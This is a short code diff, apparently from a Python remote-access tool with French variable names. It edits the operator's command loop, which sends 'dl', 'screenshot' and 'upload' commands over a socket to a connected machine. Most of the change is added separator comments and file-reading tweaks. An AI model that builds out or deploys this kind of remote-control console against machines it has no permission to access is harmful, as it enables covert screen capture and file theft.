@@ -56,19 +56,23 @@ while True:
     
     commande_split = commande.split(" ")
     dl_filename = None
+    # ------------------------------------------------------------------------------
     if len(commande_split) == 2 and commande_split[0] == "dl":
         dl_filename = commande_split[1]
+    # ------------------------------------------------------------------------------
     elif len(commande_split) == 2 and commande_split[0] == "screenshot":
         dl_filename = commande_split[1] + ".png"
+    # ------------------------------------------------------------------------------
     elif len(commande_split) == 2 and commande_split[0] == "upload":
         try:
-            f = open(commande_split[1], "rb")
+            f = open(commande_split[1], "r")
             
         except FileNotFoundError:
             reponse = " ".encode('ascii', errors='ignore')
         else:
-            commande = commande + " " + f.read().decode('ascii', errors='ignore')
+            commande = commande_split[0] + " " + commande_split[1] + " " + f.read()
             f.close()
+    # ------------------------------------------------------------------------------
         
     
     data_recues = socket_send_command_and_receive_all_data(connection_socket, commande)
